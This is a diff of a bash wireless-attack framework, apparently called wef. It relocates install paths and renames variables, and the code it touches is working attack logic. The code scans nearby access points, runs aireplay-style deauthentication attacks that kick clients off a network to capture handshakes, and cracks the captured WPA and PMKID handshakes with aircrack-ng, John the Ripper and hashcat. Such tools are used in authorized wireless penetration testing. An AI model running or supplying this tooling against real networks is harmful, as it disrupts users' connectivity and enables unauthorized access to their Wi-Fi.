+  total_amount=$(echo "1" | aircrack-ng "${1}" 2>/dev/null | grep "WPA" | grep -i "${ap_bssid}" | grep -oP '(?<=WPA \().*(?=handshake)' | tr -d " ")
   
   if [ "$total_amount" == "" ]; then
     echo 0
@@ -1425,15 +1468,15 @@ function check_captured_handshakes(){
     fi
   elif [ "$(check_handshake)" -le "0" ] && [ "$(check_pmkid_handshake)" == "true" ]; then
     if [ "$lang" == "en" ]; then
-      good_output "*" "No WPA handshakes have been captured but PMKID handshakes have been captured"
+      good_output "*" "No WPA handshake was captured but a PMKID handshake was captured"
     else
-      good_output "*" "Ningún handshakes WPA ha sido capturado pero sí PMKID"
+      good_output "*" "No se capturó ningún handshake WPA pero sí se capturó un handshake PMKID"
     fi
   elif [ "$(check_handshake)" -gt "0" ] && [ "$(check_pmkid_handshake)" == "true" ]; then
     if [ "$lang" == "en" ]; then
-      good_output "+" "$(check_handshake) WPA handshakes captured, PMKID handshakes have been captured too"
+      good_output "+" "$(check_handshake) WPA handshake captured, PMKID handshake have been captured too"
     else
-      good_output "+" "$(check_handshake) handshakes WPA capturados, handshakes PMKID han sido capturados también"
+      good_output "+" "$(check_handshake) handshakes WPA capturados, el handshake PMKID ha sido capturados también"
     fi
   elif [ "$(check_handshake)" -le "0" ] && [ "$(check_pmkid_handshake)" == "false" ]; then
     if [ "$lang" == "en" ]; then
@@ -1452,15 +1495,27 @@ function print_available_handshakes(){
   else
     if [ "$lang" == "en" ]; then
       good_output_ln "+" "File contains $(check_handshakes_in_file "${1}") WPA handshakes"
+
+      if [ "$(echo "1" | aircrack-ng "${1}" | grep "WPA" | grep "PMKID")" ]; then
+        good_output "+" "File contains at least one PMKID handshake"
+      else
+        good_output "+" "File doesn't contain a PMKID handshake"
+      fi
     else
       good_output_ln "+" "El archivo contiene $(check_handshakes_in_file "${1}") handshakes WPA"
+
+      if [ "$(echo "1" | aircrack-ng "${1}" | grep "WPA" | grep "PMKID")" ]; then
+        good_output "+" "El archivo contiene al menos un handshake PMKID"
+      else
+        good_output "+" "El archivo no contiene ningún handshake PMKID"
+      fi
     fi
   fi
 }
 
 function create_graph(){
-  if [ ! -d "/opt/wef/main/graphs" ]; then
-    mkdir "/opt/wef/main/graphs"
+  if [ ! -d "/usr/share/wef/main/graphs" ]; then
+    mkdir "/usr/share/wef/main/graphs"
   fi
 
   if [ "${create_graph}" == "true" ] && [ "$(command -v airgraph-ng)" ]; then
@@ -1483,13 +1538,13 @@ function check_and_create(){
 
 function move_capture_files(){
   # Remove useless files
-  rm "/opt/wef/main/captures/${essid}/${cap_name}-01.log.csv"
-  rm "/opt/wef/main/captures/${essid}/${cap_name}-01.kismet.csv"
-  rm "/opt/wef/main/captures/${essid}/${cap_name}-01.kismet.netxml"
+  rm "/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.log.csv"
+  rm "/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.kismet.csv"
+  rm "/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.kismet.netxml"
 
   # Rename main .csv and .cap file
-  mv "/opt/wef/main/captures/${essid}/${cap_name}-01.csv" "/opt/wef/main/captures/${essid}/${cap_name}.csv"
-  mv "/opt/wef/main/captures/${essid}/${cap_name}-01.cap" "/opt/wef/main/captures/${essid}/${cap_name}.cap"
+  mv "/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.csv" "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.csv"
+  mv "/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.cap" "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap"
 }
 
 # Sets some important variables to "" (empty) to avoid errors and more
@@ -1497,9 +1552,10 @@ function reset_info(){
   channel=""
   essid=""
   attack_time=""
-  packets_to_send=""
+  frames_to_send=""
   ap_bssid=""
   catch_handshakes=""
+  log_name=""
   c_h=""
   crack_option=""
   wordlist_to_use=""
@@ -1507,6 +1563,7 @@ function reset_info(){
   number=""
   client_number=""
   ctrl_c_pressed=""
+  ap_dir=""
 }
 
 function list_interfaces(){
@@ -1526,15 +1583,15 @@ function print_interface_mode(){
   # Check if the network adapter is in monitor mode or not
   if [ "${status_card}" == "monitor" ]; then
     if [ "$lang" == "en" ]; then
-      good_output_ln "+" "Interface mode: ${greenC}\t\tMonitor"
+      good_output "+" "Interface mode: ${greenC}monitor"
     else
-      good_output_ln "+" "Modo de la interfaz: ${greenC}\tMonitor"
+      good_output "+" "Modo de la interfaz: ${greenC}monitor"
     fi
   else
     if [ "$lang" == "en" ]; then
-      good_output_ln "+" "Interface mode: ${grayC}\t\tManaged"
+      good_output "+" "Interface mode: ${grayC}managed"
     else
-      good_output_ln "+" "Modo de la interfaz: ${grayC}\tManaged"
+      good_output "+" "Modo de la interfaz: ${grayC}managed"
     fi
   fi
 }
@@ -1544,24 +1601,24 @@ function print_interface_name(){
   if [ -d "/sys/class/net/${netCard}" ]; then
     if [ "$lang" == "en" ]; then
       if [ "$(check_interface_mode)" == "monitor" ]; then
-        echo -e "${blueC}[${greenC}+${blueC}] Interface name: ${greenC}\t\t${netCard}${endC}"
+        good_output_ln "+" "Interface name: ${greenC}${netCard}"
       else
-        echo -e "${blueC}[${greenC}+${blueC}] Interface name: ${grayC}\t\t${netCard}${endC}"
+        good_output_ln "+" "Interface name: ${grayC}${netCard}"
       fi
 
     else
       if [ "$(check_interface_mode)" == "monitor" ]; then
-        echo -e "${blueC}[${greenC}+${blueC}] Nombre de la interfaz: ${greenC}\t${netCard}${endC}"
+        good_output_ln "+" "Nombre de la interfaz: ${greenC}${netCard}"
       else
-        echo -e "${blueC}[${greenC}+${blueC}] Nombre de la interfaz: ${grayC}\t${netCard}${endC}"
+        good_output_ln "+" "Nombre de la interfaz: ${grayC}${netCard}"
       fi
     fi
 
   else
     if [ "$lang" == "en" ]; then
-      echo -e "${blueC}[${yC}X${blueC}] Interface not found${endC}"
+      echo -e "${blueC}[${yC}!${blueC}] Interface not found${endC}"
     else
-      echo -e "${blueC}[${yC}X${blueC}] Interfaz no encontrada${endC}"
+      echo -e "${blueC}[${yC}!${blueC}] Interfaz no encontrada${endC}"
     fi
   fi
 }
@@ -1578,9 +1635,9 @@ function print_mac_address(){
   if [ "$(check_interface_mode)" != "monitor" ]; then
     current_mac=$(iw dev ${netCard} info | grep "addr" | awk '{print $2}')
     if [ "$lang" == "en" ]; then
-      echo -e "${blueC}[${greenC}+${blueC}] MAC address: ${grayC}\t\t${current_mac} ${vendor}${endC}"
+      good_output "+" "MAC address: ${grayC}${current_mac} ${vendor}"
     else
-      echo -e "${blueC}[${greenC}+${blueC}] Dirección MAC: ${grayC}\t\t${current_mac} ${vendor}${endC}"
+      good_output "+" "Dirección MAC: ${grayC}${current_mac} ${vendor}"
     fi
 
   # Function enters here if the function is called with monitor mode enabled
@@ -1588,9 +1645,9 @@ function print_mac_address(){
   elif [ "$(check_interface_mode)" == "monitor" ]; then
     current_mac=$(macchanger -s ${netCard} | grep "Curr" | awk '{print $3}' | tr '[:lower:]' '[:upper:]')
     if [ "$lang" == "en" ]; then
-      echo -e "${blueC}[${greenC}+${blueC}] MAC address: ${greenC}\t\t${current_mac} ${vendor}${endC}"
+      good_output "+" "MAC address: ${greenC}${current_mac} ${vendor}"
     else
-      echo -e "${blueC}[${greenC}+${blueC}] Dirección MAC: ${greenC}\t\t${current_mac} ${vendor}${endC}"
+      good_output "+" "Dirección MAC: ${greenC}${current_mac} ${vendor}"
     fi
 
   else
@@ -1611,46 +1668,46 @@ function print_freq_band(){
     if [ "$(echo ${out} | grep "\[6\]")" ] && [ ! "$(echo ${out} | grep "\[36\]")" ]; then
 
       if [ "$(check_interface_mode)" == "monitor" ]; then
-        good_output "+" "Frequency:\t\t${greenC}2.4GHz"
+        good_output "+" "Frequency: ${greenC}2.4GHz"
       else  
-        good_output "+" "Frequency:\t\t${grayC}2.4GHz"
+        good_output "+" "Frequency: ${grayC}2.4GHz"
       fi
 
     elif [ "$(echo ${out} | grep "\[6\]")" ] && [ "$(echo ${out} | grep "\[36\]")" ]; then
       if [ "$(check_interface_mode)" == "monitor" ]; then
-        good_output "+" "Frequencies:\t\t${greenC}2.4GHz and 5GHz"
+        good_output "+" "Frequencies: ${greenC}2.4GHz and 5GHz"
       else
-        good_output "+" "Frequencies:\t\t${grayC}2.4GHz and 5GHz"
+        good_output "+" "Frequencies: ${grayC}2.4GHz and 5GHz"
       fi
 
     else
       if [ "$(check_interface_mode)" == "monitor" ]; then
-        good_output "+" "Frequency:\t\t${greenC}5GHz"
+        good_output "+" "Frequency: ${greenC}5GHz"
       else
-        good_output "+" "Frequency:\t\t${grayC}5GHz"
+        good_output "+" "Frequency: ${grayC}5GHz"
       fi
     fi
 
   else
     if [ "$(echo ${out} | grep "\[6\]")" ] && [ ! "$(echo ${out} | grep "\[36\]")" ]; then
       if [ "$(check_interface_mode)" == "monitor" ]; then
-        good_output "+" "Frecuencia:\t\t${greenC}2.4GHz"
+        good_output "+" "Frecuencia: ${greenC}2.4GHz"
       else
-        good_output "+" "Frecuencia:\t\t${grayC}2.4GHz"
+        good_output "+" "Frecuencia: ${grayC}2.4GHz"
       fi
 
     elif [ "$(echo ${out} | grep "\[6\]")" ] && [ "$(echo ${out} | grep "\[36\]")" ]; then
       if [ "$(check_interface_mode)" == "monitor" ]; then
-        good_output "+" "Frecuencias:\t\t${greenC}2.4GHz y 5GHz"
+        good_output "+" "Frecuencias: ${greenC}2.4GHz y 5GHz"
       else
-        good_output "+" "Frecuencias:\t\t${grayC}2.4GHz y 5GHz"
+        good_output "+" "Frecuencias: ${grayC}2.4GHz y 5GHz"
       fi
 
     else
       if [ "$(check_interface_mode)" == "monitor" ]; then
-        good_output "+" "Frecuencia:\t\t${greenC}5GHz"
+        good_output "+" "Frecuencia: ${greenC}5GHz"
       else
-        good_output "+" "Frecuencia:\t\t${grayC}5GHz"
+        good_output "+" "Frecuencia: ${grayC}5GHz"
       fi
     fi
   fi
@@ -1666,7 +1723,7 @@ function enable_mon(){
       color_output_ln "*" "Configurando la interfaz de la tarjeta de red (${netCard})..."
     fi
 
-    if [ "${kill_network_services}" == "true" ]; then
+    if [ "${airmon_check_kill}" == "true" ]; then
       airmon-ng check kill &>/dev/null
     fi
 
@@ -1769,7 +1826,7 @@ function select_cracking_method(){
     fi
 
     if [ "$crack_option" == "1" ]; then
-      crack_handshake_aircrack "/opt/wef/main/captures/${essid}/${cap_name}.cap"
+      crack_handshake_aircrack "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap"
       break
     elif [ "$crack_option" == "2" ]; then
       john_tools_missing="false"
@@ -1784,7 +1841,7 @@ function select_cracking_method(){
       fi
 
       if [ "$john_tools_missing" != "true" ]; then
-        crack_handshake_john "/opt/wef/main/captures/${essid}/${cap_name}.cap"
+        crack_handshake_john "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap"
         break
       fi
 
@@ -1801,7 +1858,7 @@ function select_cracking_method(){
       fi
 
       if [ "$hashcat_tools_missing" != "true" ]; then
-        crack_handshake_aircrack "/opt/wef/main/captures/${essid}/${cap_name}.cap"
+        crack_handshake_aircrack "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap"
         break
       fi
     fi
@@ -1810,7 +1867,7 @@ function select_cracking_method(){
 
 # Main default cracking function
 function crack_handshake(){
-  if [ "$(check_target_handshakes_in_file "/opt/wef/main/captures/${essid}/${cap_name}.cap")" -le 0 ] && [ "$(check_pmkid_handshake)" != "true" ]; then
+  if [ "$(check_target_handshakes_in_file "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap")" -le 0 ] && [ "$(check_pmkid_handshake)" != "true" ]; then
     if [ "$lang" == "en" ]; then
       color_output_ln "*" "File contains no handshakes"
     else
@@ -1844,13 +1901,13 @@ function crack_handshake_aircrack(){
     fi
 
     if [ "$lang" == "en" ]; then
-      color_output_ln "*" "Press Ctrl + C to stop aircrack-ng"
+      color_output_ln "*" "Press Ctrl+C to stop aircrack-ng"
     else
-      color_output_ln "*" "Presiona Ctrl + C para parar aircrack-ng"
+      color_output_ln "*" "Presiona Ctrl+C para parar aircrack-ng"
     fi; sleep 1.5
 
     trap crack_c INT
-    aircrack-ng -w ${wordlist_to_use} "${1}" | tee # use "tee" so the command stops with Ctrl + C
+    aircrack-ng -w ${wordlist_to_use} "${1}" | tee # use "tee" so the command stops with Ctrl+C
 
     log_cracking_completed
   else
@@ -1873,19 +1930,19 @@ function crack_handshake_john(){
       return
     fi
 
-    rm /opt/wef/cache/handshake.jtr 2>/dev/null
+    rm /usr/share/wef/cache/handshake.jtr 2>/dev/null
 
     trap crack_c INT
-    wpapcap2john "${1}" > "/opt/wef/cache/handshake.jtr" 2>/dev/null
+    wpapcap2john "${1}" > "/usr/share/wef/cache/handshake.jtr" 2>/dev/null
     sleep 0.5
 
     if [ "$lang" == "en" ]; then
-      color_output_ln "*" "Press Ctrl + C to stop JTR"
+      color_output_ln "*" "Press Ctrl+C to stop JTR"
     else
-      color_output_ln "*" "Presiona Ctrl + C para parar JTR"
+      color_output_ln "*" "Presiona Ctrl+C para parar JTR"
     fi
 
-    john --wordlist="${wordlist_to_use}" "/opt/wef/cache/handshake.jtr"
+    john --wordlist="${wordlist_to_use}" "/usr/share/wef/cache/handshake.jtr"
     echo
 
     log_cracking_completed
@@ -1911,20 +1968,20 @@ function crack_handshake_hashcat(){
         return
       fi
 
-      rm /opt/wef/cache/hashcat_hashes.txt 2>/dev/null
+      rm /usr/share/wef/cache/hashcat_hashes.txt 2>/dev/null
 
       # Convert hashes to readable hashcat format
-      hcxpcapngtool -o "/opt/wef/cache/hashcat_hashes.txt" "${1}" &>/dev/null
+      hcxpcapngtool -o "/usr/share/wef/cache/hashcat_hashes.txt" "${1}" &>/dev/null
 
-      if [ -f "/opt/wef/cache/hashcat_hashes.txt" ] && [ "$(wc -l "/opt/wef/cache/hashcat_hashes.txt" | awk '{print $1}')" != "0" ]; then
+      if [ -f "/usr/share/wef/cache/hashcat_hashes.txt" ] && [ "$(wc -l "/usr/share/wef/cache/hashcat_hashes.txt" | awk '{print $1}')" != "0" ]; then
         if [ "$lang" == "en" ]; then
-          color_output_ln "*" "Press Ctrl + C to stop hashcat"
+          color_output_ln "*" "Press Ctrl+C to stop hashcat"
         else
-          color_output_ln "*" "Presiona Ctrl + C para parar hashcat"
+          color_output_ln "*" "Presiona Ctrl+C para parar hashcat"
         fi
 
         # Crack hashes with hashcat
-        hashcat -m 22000 "/opt/wef/cache/hashcat_hashes.txt" "${wordlist_to_use}"
+        hashcat -m 22000 "/usr/share/wef/cache/hashcat_hashes.txt" "${wordlist_to_use}"
         echo
 
         log_cracking_completed
@@ -1938,9 +1995,9 @@ function crack_handshake_hashcat(){
     elif [ "$(file "${1}" | grep "ASCII text")" ]; then
       if [ "$(wc -l "${1}" | awk '{print $1}')" != "0" ]; then
         if [ "$lang" == "en" ]; then
-          color_output_ln "*" "Press Ctrl + C to stop hashcat"
+          color_output_ln "*" "Press Ctrl+C to stop hashcat"
         else
-          color_output_ln "*" "Presiona Ctrl + C para parar hashcat"
+          color_output_ln "*" "Presiona Ctrl+C para parar hashcat"
         fi
 
         # Crack hashes with hashcat
@@ -1977,9 +2034,9 @@ function crack_pmkid_handshakes(){
     ask_dict
 
     if [ "$lang" == "en" ]; then
-      color_output_ln "*" "Press Ctrl + C to stop hashcat"
+      color_output_ln "*" "Press Ctrl+C to stop hashcat"
     else
-      color_output_ln "*" "Presiona Ctrl + C para parar hashcat"
+      color_output_ln "*" "Presiona Ctrl+C para parar hashcat"
     fi; sleep 1.5
 
     hashcat -m 22000 "${1}" "${wordlist_to_use}" -d 1
@@ -2001,13 +2058,13 @@ function crack_pmkid_handshakes(){
 function crack_ivs(){
   if [ -f "${1}" ]; then
     if [ "$lang" == "en" ]; then
-      color_output_ln "*" "Press Ctrl + C to stop aircrack-ng"
+      color_output_ln "*" "Press Ctrl+C to stop aircrack-ng"
     else
-      color_output_ln "*" "Presiona Ctrl + C para parar aircrack-ng"
+      color_output_ln "*" "Presiona Ctrl+C para parar aircrack-ng"
     fi; sleep 1.5
 
     trap crack_c INT
-    aircrack-ng "${1}" | tee # use "tee" so the command stops with Ctrl + C
+    aircrack-ng "${1}" | tee # use "tee" so the command stops with Ctrl+C
 
     log_cracking_completed
   fi
@@ -2021,25 +2078,25 @@ function crack_ivs(){
 #
 
 function scan_aps(){
-  if [ ! -f "/opt/wef/cache/airodump-01.csv" ] || [ "$scan_on_each_attack" == "true" ]; then # Check if an AP scan already exists
-    if [ "$kill_network_services" != "true" ]; then # If using in headless, stop scanning with Ctrl+C
+  if [ ! -f "/usr/share/wef/cache/airodump-01.csv" ] || [ "$scan_on_each_attack" == "true" ]; then # Check if an AP scan already exists
+    if [ "$airmon_check_kill" != "true" ]; then # If using in headless, stop scanning with Ctrl+C
       trap ctrl_c_pressed=true INT
       if [ "$lang" == "en" ]; then
         press_enter "Press [Enter] to start scanning APs, then press Ctrl+C to stop "
       else
         press_enter "Presiona [Enter] para empezar a escanear APs, después presiona Ctrl+C para parar "
-      fi; sleep 0.5
+      fi; sleep 1
     fi
 
     launch_scan
     
-    if [ "$kill_network_services" == "true" ]; then
+    if [ "$airmon_check_kill" == "true" ]; then
       if [ "$lang" == "en" ]; then
         press_enter "Press [Enter] to stop scanning APs and continue "
       else
         press_enter "Presiona [Enter] para dejar de escanear APs y continuar "
-      fi; sleep 0.8
-    elif [ "$kill_network_services" == "false" ]; then # If using in headless, keep refreshing APs info until Ctrl+C is pressed
+      fi; sleep 1
+    elif [ "$airmon_check_kill" == "false" ]; then # If using in headless, keep refreshing APs info until Ctrl+C is pressed
       sleep 0.5
       while true; do
         if [ ! "$ctrl_c_pressed" ]; then
@@ -2052,7 +2109,7 @@ function scan_aps(){
       done
     fi
 
-    if [ "$kill_network_services" != "true" ]; then
+    if [ "$airmon_check_kill" != "true" ]; then
       clear
       trap keep_exit_c INT
     fi
@@ -2070,32 +2127,32 @@ function scan_aps(){
 }
 
 function launch_scan(){
-  if [ ! "${frecuency_band}" ]; then
-    frecuency_band="2.4"
+  if [ ! "${frequency_band}" ]; then
+    frequency_band="2.4"
   fi
 
-  rm /opt/wef/cache/airodump-* 2>/dev/null
+  rm /usr/share/wef/cache/airodump-* 2>/dev/null
 
-  if [ "$kill_network_services" == "true" ]; then
-    xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -w \"/opt/wef/cache/airodump\" --band ${band} ${netCard}" 2>/dev/null &
+  if [ "$airmon_check_kill" == "true" ]; then
+    xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -w \"/usr/share/wef/cache/airodump\" --output-format csv --band ${band} ${netCard}" 2>/dev/null &
   else
-    airodump-ng -w "/opt/wef/cache/airodump" --band ${band} ${netCard} &>/dev/null &
+    airodump-ng -w "/usr/share/wef/cache/airodump" --output-format csv --band ${band} ${netCard} &>/dev/null &
   fi
 
   airodump_PID=$!
 }
 
 function format_csv_info(){
-  if [ -f "/opt/wef/cache/airodump-01.csv" ]; then
+  if [ -f "/usr/share/wef/cache/airodump-01.csv" ]; then
     # Access Points
-    aps_headers="$(cat /opt/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | column -t -s, | head -n 1)"
+    aps_headers="$(cat /usr/share/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | column -t -s, | head -n 1)"
 
-    aps="$(cat /opt/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | column -t -s, | tail -n +2)"
+    aps="$(cat /usr/share/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | column -t -s, | tail -n +2)"
 
     # Stations
-    stations_headers="$(cat /opt/wef/cache/airodump-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/' | column -t -s, | head -n 1)"
+    stations_headers="$(cat /usr/share/wef/cache/airodump-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/' | column -t -s, | head -n 1)"
 
-    stations="$(cat /opt/wef/cache/airodump-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7- -d, | sed 's/# packets/Packets/' | column -t -s, | tail -n +2)"
+    stations="$(cat /usr/share/wef/cache/airodump-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7- -d, | sed 's/# packets/Packets/' | column -t -s, | tail -n +2)"
 
     if [ "${aps_headers}" ] && [ "${aps}" ]; then
       # Print info
@@ -2115,15 +2172,15 @@ function format_csv_info(){
       if [ "${stations}" ]; then
         if [ "$identify_devices" == "false" ]; then
           echo -e "\n${yC}${stations_headers}${endC}"
-        elif [ "$identify_devices" == "true" ] && [ "${stations}" ] && [ "$kill_network_services" == "true" ]; then
+        elif [ "$identify_devices" == "true" ] && [ "${stations}" ] && [ "$airmon_check_kill" == "true" ]; then
           echo -e "\n${yC}${stations_headers}               Station Vendor${endC}"
-        elif [ "$identify_devices" == "true" ] && [ "${stations}" ] && [ "$kill_network_services" == "false" ] && [ "$ctrl_c_pressed" ]; then
+        elif [ "$identify_devices" == "true" ] && [ "${stations}" ] && [ "$airmon_check_kill" == "false" ] && [ "$ctrl_c_pressed" ]; then
           echo -e "\n${yC}${stations_headers}               Station Vendor${endC}"
         else
           echo -e "\n${yC}${stations_headers}${endC}"
         fi
 
-        if [ "${identify_devices}" == "true" ] && [ "${stations}" ] && [ "$kill_network_services" == "true" ]; then
+        if [ "${identify_devices}" == "true" ] && [ "${stations}" ] && [ "$airmon_check_kill" == "true" ]; then
           while read -r line; do
             station_mac="$(echo "${line}" | awk '{print $1}')"
 
@@ -2139,7 +2196,7 @@ function format_csv_info(){
               echo -e "${grayC}${line}${endC}"
             fi
           done <<< "${stations}"
-        elif [ "$identify_devices" == "true" ] && [ "${stations}" ] && [ "$kill_network_services" == "false" ] && [ "$ctrl_c_pressed" ]; then
+        elif [ "$identify_devices" == "true" ] && [ "${stations}" ] && [ "$airmon_check_kill" == "false" ] && [ "$ctrl_c_pressed" ]; then
           while read -r line; do
             station_mac="$(echo "${line}" | awk '{print $1}')"
 
@@ -2170,11 +2227,11 @@ function format_csv_info(){
 }
 
 function format_csv_clients_info(){
-  if [ -f "/opt/wef/cache/airodump-devices-01.csv" ]; then
+  if [ -f "/usr/share/wef/cache/airodump-devices-01.csv" ]; then
     # Stations
-    stations_headers="$(cat "/opt/wef/cache/airodump-devices-01.csv" | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/'  | column -t -s, | head -n 1)"
+    stations_headers="$(cat "/usr/share/wef/cache/airodump-devices-01.csv" | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/'  | column -t -s, | head -n 1)"
 
-    stations="$(cat "/opt/wef/cache/airodump-devices-01.csv" | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/'  | column -t -s, | tail -n +2)"
+    stations="$(cat "/usr/share/wef/cache/airodump-devices-01.csv" | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/'  | column -t -s, | tail -n +2)"
 
     echo -e "${yC}Number   ${stations_headers}${endC}"
 
@@ -2221,33 +2278,33 @@ function format_csv_clients_info(){
 function scan_aps_wps(){
   trap wash_c INT
 
-  if [ ! "${frecuency_band}" ]; then
-    frecuency_band="2.4"
+  if [ ! "${frequency_band}" ]; then
+    frequency_band="2.4"
   fi
 
   if [ "${band}" == "g" ]; then
     if [ "$lang" == "en" ]; then
-      color_output_ln "*" "Scanning nearby 2.4GHz access points, press Ctrl + C to stop and continue...\n"
+      color_output_ln "*" "Scanning nearby 2.4GHz access points, press Ctrl+C to stop and continue...\n"
     else
-      color_output_ln "*" "Escaneando puntos de acceso cercanos de 2.4GHz, presiona Ctrl + C para parar y continuar...\n"
+      color_output_ln "*" "Escaneando puntos de acceso cercanos de 2.4GHz, presiona Ctrl+C para parar y continuar...\n"
     fi
-    wash -2 -a -i ${netCard} | tee /opt/wef/cache/wps_scan.txt &
+    wash -2 -a -i ${netCard} | tee /usr/share/wef/cache/wps_scan.txt &
 
   elif [ "${band}" == "a" ]; then
     if [ "$lang" == "en" ]; then
-      color_output_ln "*" "Scanning nearby 5GHz access points, press Ctrl + C to stop and continue...\n"
+      color_output_ln "*" "Scanning nearby 5GHz access points, press Ctrl+C to stop and continue...\n"
     else
-      color_output_ln "*" "Escaneando puntos de acceso cercanos de 5GHz, presiona Ctrl + C para parar y continuar...\n"
+      color_output_ln "*" "Escaneando puntos de acceso cercanos de 5GHz, presiona Ctrl+C para parar y continuar...\n"
     fi
-    wash -5 -a -i ${netCard} | tee /opt/wef/cache/wps_scan.txt &
+    wash -5 -a -i ${netCard} | tee /usr/share/wef/cache/wps_scan.txt &
 
   elif [ "${band}" == "ag" ]; then
     if [ "$lang" == "en" ]; then
-      color_output_ln "*" "Scanning nearby 2.4GHz and 5GHz access points, press Ctrl + C to stop and continue...\n"
+      color_output_ln "*" "Scanning nearby 2.4GHz and 5GHz access points, press Ctrl+C to stop and continue...\n"
     else
-      color_output_ln "*" "Escaneando puntos de acceso cercanos de 2.4GHz and 5GHz, presiona Ctrl + C para parar y continuar...\n"
+      color_output_ln "*" "Escaneando puntos de acceso cercanos de 2.4GHz and 5GHz, presiona Ctrl+C para parar y continuar...\n"
     fi
-    wash -2 -5 -a -i ${netCard} | tee /opt/wef/cache/wps_scan.txt &
+    wash -2 -5 -a -i ${netCard} | tee /usr/share/wef/cache/wps_scan.txt &
   fi
 
   wash_PID=$!
@@ -2256,8 +2313,8 @@ function scan_aps_wps(){
 }
 
 function list_aps(){
-  if [ -f "/opt/wef/cache/wps_scan.txt" ]; then
-    echo; cat /opt/wef/cache/wps_scan.txt
+  if [ -f "/usr/share/wef/cache/wps_scan.txt" ]; then
+    echo; cat /usr/share/wef/cache/wps_scan.txt
   else
     if [ "$lang" == "en" ]; then
       color_output_ln "*" "APs list not found. Execute ${yC}scan${blueC} to scan nearby APs"
@@ -2281,6 +2338,7 @@ function list_aps(){
 # Deauthentication attack main function (aireplay-ng)
 function deauthentication_attack(){
   clear
+  color_output_ln "*" "In this attack, the devices connected to an access point will be kicked off in order to try to catch a handshake"
   scan_aps # Scan nearby APs
   
   log_back_to_menu
@@ -2295,7 +2353,7 @@ function deauthentication_attack(){
     if [ "$lang" == "en" ]; then
       color_output_no_line "*" "Do you want to deauthenticate all clients (${yC}1${blueC}) or an especific client (${yC}2${blueC})? (default=1): " && read deauth_option
     else
-      color_output_no_line "*" "¿Quieres deautenticar a todos los clientes (${yC}1${blueC}) o solo a un cliente esppecífico (${yC}2${blueC})? (default=1): " && read deauth_option
+      color_output_no_line "*" "¿Quieres deautenticar a todos los clientes (${yC}1${blueC}) o solo a un cliente específico (${yC}2${blueC})? (por defecto=1): " && read deauth_option
     fi
 
     if [ "${deauth_option}" == "back" ]; then
@@ -2316,7 +2374,13 @@ function deauthentication_attack(){
     fi
   done
 
-  check_and_create "/opt/wef/main/captures/${essid}"
+  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
+    ap_dir="${essid}-${ap_bssid}"
+  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
+    ap_dir="${ap_bssid}"
+  fi
+
+  check_and_create "/usr/share/wef/main/captures/${ap_dir}"
 
   if [ "${deauth_option}" == "1" ] || [ ! "${deauth_option}" ]; then
     deauth_all_clients
@@ -2329,8 +2393,8 @@ function deauth_all_clients(){
   ask_to_capture_handshakes
 
   default="10"
-  ask_packets
-  if [ "$packets_to_send" == "back" ]; then
+  ask_frames
+  if [ "$frames_to_send" == "back" ]; then
     if [ "$c_h" == "true" ]; then
       kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null
     fi
@@ -2342,19 +2406,19 @@ function deauth_all_clients(){
   press_enter_attack
   echo
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting Deauthentication attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting Deauthentication attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque de Deautenticación, presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque de Deautenticación, presiona Ctrl+C para pararlo"
   fi
 
   iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel
   sleep 0.2
 
   if [ "$verbose" == "false" ]; then
